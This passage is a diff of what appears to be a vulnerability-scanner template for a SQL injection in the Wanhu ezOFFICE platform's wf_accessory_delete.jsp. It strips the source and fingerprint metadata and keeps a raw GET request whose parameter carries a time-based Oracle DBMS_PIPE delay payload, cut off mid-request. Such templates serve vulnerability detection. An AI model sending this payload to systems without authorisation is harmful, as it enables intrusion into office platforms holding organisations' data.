@@ -3,14 +3,8 @@ info:
   name: 万户协同办公平台ezofficewf_accessory_delete存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9fe225380199a4470c48acc010a5e21e
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 9fe225380199a4470c48acc010a5e21e
-    fofa: + hunter`app.name="万户 Ezoffice OA"`
 http:
 - raw:
   - 'GET /defaultroot/platform/bpm/work_flow/operate/wf_accessory_delete.jsp;?wf_work_accessory_id=1+AND+2582%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%28106%29%7C%7CCHR%28100%29%7C%7CCHR%2865%29%2C5%29 HTTP/1.1
